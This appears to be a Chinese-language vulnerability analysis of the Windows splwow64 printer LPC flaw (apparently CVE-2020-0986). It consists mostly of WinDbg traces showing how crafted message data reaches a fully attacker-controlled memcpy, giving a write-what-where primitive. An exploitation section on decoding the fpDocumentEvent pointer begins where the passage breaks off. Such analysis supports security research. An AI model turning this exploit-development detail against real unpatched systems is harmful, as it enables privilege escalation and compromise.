    splwow64!TLPCMgr::ProcessRequest+0xe8:
    00007ff7`0bf17794 ff1506720000    call    qword ptr [splwow64!_imp_memcpy_s (00007ff7`0bf1e9a0)] ds:00007ff7`0bf1e9a0={msvcrt!memcpy_s (00007ffa`c8fcd0e0)}
    0:007> r
    rax=0000000000d785e0 rbx=0000000000000088 rcx=0000000000d785e0
    rdx=0000000000000088 rsi=0000000000d785e0 rdi=0000000000d7cac0
    rip=00007ff70bf17794 rsp=000000000279f2e0 rbp=0000000000000000
     r8=0000000000d20000  r9=0000000000000088 r10=0000000000d70000
    r11=000000000279f250 r12=00007ff70bf22048 r13=0000000000d756f0
    r14=0000000000000057 r15=0000000000000000
    iopl=0         nv up ei pl nz na pe nc
    cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
    splwow64!TLPCMgr::ProcessRequest+0xe8:
    00007ff7`0bf17794 ff1506720000    call    qword ptr [splwow64!_imp_memcpy_s (00007ff7`0bf1e9a0)] ds:00007ff7`0bf1e9a0={msvcrt!memcpy_s (00007ffa`c8fcd0e0)}
rcx、rdx、r8、r9分别为memcpy_s的四个参数，rcx指向InputBuffer，rdx和r9为size。
r8指向用于LPC通信的共享内存
复制到InputBuffer的数据
    0:007> p
    splwow64!TLPCMgr::ProcessRequest+0xee:
    00007ff7`0bf1779a 4c8b6740        mov     r12,qword ptr [rdi+40h] ds:00000000`00d7cb00=0000000000d20088
    0:007> dq rcx l11
    00000000`00d785e0  0000006d`00000000 00000000`00000000
    00000000`00d785f0  00000000`00000000 00000000`00d20100
    00000000`00d78600  00000005`00000005 00000000`00000000
    00000000`00d78610  00000000`00000000 00000020`00000001
    00000000`00d78620  00000000`00000000 00000000`00000000
    00000000`00d78630  00000000`00d20800 41414141`41414141
    00000000`00d78640  00000000`00000000 00000000`00000000
    00000000`00d78650  00000000`00000000 00000000`00000000
    00000000`00d78660  00000000`00000000
接着给v9，v10，v11赋值
    0:007> r rdi
    rdi=0000000000d7cac0 //PORT_MESSAGE
    0:007> p
    splwow64!TLPCMgr::ProcessRequest+0xee:
    00007ff7`0bf1779a 4c8b6740        mov     r12,qword ptr [rdi+40h] 
    //r12 为 V9 = PtrMsgReply ds:00000000`00d7cb00=0000000000d20088
    0:007> p
    splwow64!TLPCMgr::ProcessRequest+0xf2:
    00007ff7`0bf1779e 448b7738        mov     r14d,dword ptr [rdi+38h]
    //r14d 为 v10 = MsgReplyLen ds:00000000`00d7caf8=00000010
    0:007> p
    splwow64!TLPCMgr::ProcessRequest+0xf6:
    00007ff7`0bf177a2 0fb75f04        movzx   ebx,word ptr [rdi+4] ds:00000000`00d7cac4=0001
    //ebx 为 v11 = MessageType
    0:007> p
    splwow64!TLPCMgr::ProcessRequest+0xfa:
    00007ff7`0bf177a6 488b0d9ba80000  mov     rcx,qword ptr [splwow64!WPP_GLOBAL_Control (00007ff7`0bf22048)] ds:00007ff7`0bf22048={splwow64!WPP_MAIN_CB (00007ff7`0bf22708)}
    0:007> r
    rax=0000000000000000 rbx=0000000000000001 rcx=0000000000d785e0
    rdx=fffffffffffa7a20 rsi=0000000000d785e0 rdi=0000000000d7cac0
    rip=00007ff70bf177a6 rsp=000000000279f2e0 rbp=0000000000000000
     r8=0000000000000000  r9=0000000000000000 r10=0000000000d70000
    r11=0000000000d785e0 r12=0000000000d20088 r13=0000000000d756f0
    r14=0000000000000010 r15=0000000000000000
    iopl=0         nv up ei pl nz na pe nc
    cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
    splwow64!TLPCMgr::ProcessRequest+0xfa:
    00007ff7`0bf177a6 488b0d9ba80000  mov     rcx,qword ptr [splwow64!WPP_GLOBAL_Control (00007ff7`0bf22048)] ds:00007ff7`0bf22048={splwow64!WPP_MAIN_CB (00007ff7`0bf22708)}
经过一系列的判断后，程序最终进入了gdi32full!GdiPrinterThunk，且传入的三个参数为：InputBuffer、PtrMsgReply和MsgReplyLen。
    0:007> p
    splwow64!TLPCMgr::ProcessRequest+0x1ec:
    00007ff7`0bf17898 458bc6          mov     r8d,r14d
    0:007> p
    splwow64!TLPCMgr::ProcessRequest+0x1ef:
    00007ff7`0bf1789b 498bd4          mov     rdx,r12
    0:007> p
    splwow64!TLPCMgr::ProcessRequest+0x1f2:
    00007ff7`0bf1789e 488bce          mov     rcx,rsi
    0:007> p
    splwow64!TLPCMgr::ProcessRequest+0x1f5:
    00007ff7`0bf178a1 ff15e9720000    call    qword ptr [splwow64!_guard_dispatch_icall_fptr (00007ff7`0bf1eb90)] ds:00007ff7`0bf1eb90={ntdll!LdrpDispatchUserCallTarget (00007ffa`c946c590)}
    0:007> r
    rax=00007ffac8e48eb0 rbx=0000000000000000 rcx=0000000000d785e0
    rdx=0000000000d20088 rsi=0000000000d785e0 rdi=0000000000d7cac0
    rip=00007ff70bf178a1 rsp=000000000279f2e0 rbp=0000000000000000
     r8=0000000000000010  r9=0000000000000000 r10=0000000000d70000
    r11=0000000000d785e0 r12=0000000000d20088 r13=0000000000d756f0
    r14=0000000000000010 r15=0000000000000000
    iopl=0         nv up ei pl zr na po nc
    cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
    splwow64!TLPCMgr::ProcessRequest+0x1f5:
    00007ff7`0bf178a1 ff15e9720000    call    qword ptr [splwow64!_guard_dispatch_icall_fptr (00007ff7`0bf1eb90)] ds:00007ff7`0bf1eb90={ntdll!LdrpDispatchUserCallTarget (00007ffa`c946c590)}
    ..................................................
    0:007> p
    ntdll!LdrpDispatchUserCallTarget+0x7:
    00007ffa`c946c597 4c8bd0          mov     r10,rax
    0:007> ln rax
    Browse module
    Clear breakpoint 2
    (00007ffa`c8e48eb0)   GDI32!GdiPrinterThunk   |  (00007ffa`c8e48ebc)   GDI32!_imp_load_GdiProcessSetup
    Exact matches:
    0:007> p
    ntdll!LdrpDispatchUserCallTarget+0xa:
    00007ffa`c946c59a 49c1ea09        shr     r10,9
    0:007> 
    ntdll!LdrpDispatchUserCallTarget+0xe:
    00007ffa`c946c59e 4f8b1cd3        mov     r11,qword ptr [r11+r10*8] ds:00007ff5`d81a9238=8888888888888888
    0:007> 
    ntdll!LdrpDispatchUserCallTarget+0x12:
    00007ffa`c946c5a2 4c8bd0          mov     r10,rax
    0:007> ln rax
    Browse module
    Clear breakpoint 2
    (00007ffa`c8e48eb0)   GDI32!GdiPrinterThunk   |  (00007ffa`c8e48ebc)   GDI32!_imp_load_GdiProcessSetup
    Exact matches:
    .............................................
    0:007> p
    Breakpoint 1 hit
    gdi32full!GdiPrinterThunk:
    00007ffa`c71a59b0 48895c2410      mov     qword ptr [rsp+10h],rbx ss:00000000`0279f2e8=0000000000d785e0
    0:007> r
    rax=00007ffac8e48eb0 rbx=0000000000000000 rcx=0000000000d785e0
    rdx=0000000000d20088 rsi=0000000000d785e0 rdi=0000000000d7cac0
    rip=00007ffac71a59b0 rsp=000000000279f2d8 rbp=0000000000000000
     r8=0000000000000010  r9=0000000000000000 r10=00000fff591c91d7
    r11=8888888888888888 r12=0000000000d20088 r13=0000000000d756f0
    r14=0000000000000010 r15=0000000000000000
    iopl=0         nv up ei pl nz na po cy
    cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000207
    gdi32full!GdiPrinterThunk:
    00007ffa`c71a59b0 48895c2410      mov     qword ptr [rsp+10h],rbx ss:00000000`0279f2e8=0000000000d785e0
进入gdi32full!GdiPrinterThunk函数后，先获取索引值，因为不同的索引值，会被不同的函数处理。索引值为位于InputBuffer+0x4处的DWORD。
下面是我们期望进入的处理函数，可以看出，当Fun_Index为0x6D，就可以进入我们期望的代码块。
在进入触发漏洞的代码Memcpy前，还要经过4个if判断和一个Decode函数。
这4个if判断的值，都可以被我们直接或间接控制，所以程序最终会来到漏洞函数Memcpy，且三个参数：目的地址、源地址、大小都可以被我们控制，所以这里实现了一个在splwow64进程空间内的
Write What Where Primitive
。Decode函数的作用是对Encode的DocumentEvent指针进行解码，也就是对fpDocumentEvent指针进行解码，从而得到真实的函数指针。
    0:007> 
    gdi32full!GdiPrinterThunk+0x2ac:
    00007ffa`c71a5c5c 488b0d85d51300  mov     rcx,qword ptr [gdi32full!fpDocumentEvent (00007ffa`c72e31e8)] ds:00007ffa`c72e31e8=7ec611be0000fff5
    0:007> p
    gdi32full!GdiPrinterThunk+0x2b3:
    00007ffa`c71a5c63 48ff1536960a00  call    qword ptr [gdi32full!_imp_RtlDecodePointer (00007ffa`c724f2a0)] ds:00007ffa`c724f2a0={ntdll!RtlDecodePointer (00007ffa`c94477a0)}
    0:007> p
    gdi32full!GdiPrinterThunk+0x2ba:
    00007ffa`c71a5c6a 0f1f440000      nop     dword ptr [rax+rax]
    0:007> ln rax
    Browse module
    Set bu breakpoint
    (00007ffa`b1328f80)   WINSPOOL!DocumentEvent   |  (00007ffa`b132939c)   WINSPOOL!CallDrvDocumentEvent
    Exact matches:
        WINSPOOL!DocumentEvent (void)
    0:007> 
    gdi32full!GdiPrinterThunk+0x1fd4a:
    00007ffa`c71c56fa e834d5feff      call    gdi32full!memcpy (00007ffa`c71b2c33)
    0:007> r
    rax=0000000000d20800 rbx=0000000000d20160 rcx=4141414141414141
    rdx=0000000000d20810 rsi=0000000000d20088 rdi=0000000000d785e0
    rip=00007ffac71c56fa rsp=000000000279f210 rbp=000000000279f279
     r8=0000000000000008  r9=0000000000000100 r10=00000fff5920c6c0
    r11=000000000279f0e0 r12=0000000000000000 r13=0000000000000001
    r14=0000000000000010 r15=0000000000000000
    iopl=0         nv up ei ng nz ac po cy
    cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000297
    gdi32full!GdiPrinterThunk+0x1fd4a:
    00007ffa`c71c56fa e834d5feff      call    gdi32full!memcpy (00007ffa`c71b2c33)
## 漏洞利用
通过上面对POC的分析，我们得到了如下信息。
  1. 传入splwow64.exe进程的LPC消息，我们可以自由构造，所以我们可以控制程序流程每次都走到DocumentEvent函数。
  2. 我们拥有一个任意地址写的原语。
参考[卡巴斯基](https://securelist.com/operation-powerfall-cve-2020-0986-and-variants/98329/)的分析文章，我们知道fpDocumentEvent函数指针是被编码过的值，且每一次编码得到的值都不同，这取决于当前的Cookie值。
    __int64 __fastcall RtlEncodePointer(__int64 a1)
    {
      __int64 v1; // rax
      __int64 v2; // rbx
      unsigned int v4; // eax
      unsigned int v5; // [rsp+48h] [rbp+10h]
      v1 = (unsigned int)`RtlpGetCookieValue'::`2'::CookieValue;
      v2 = a1;
      if ( !`RtlpGetCookieValue'::`2'::CookieValue )
      {
        v4 = NtQueryInformationProcess(-1i64, 36i64, &v5);
        if ( (v4 & 0x80000000) != 0 )
          RtlRaiseStatus(v4);
        v1 = v5;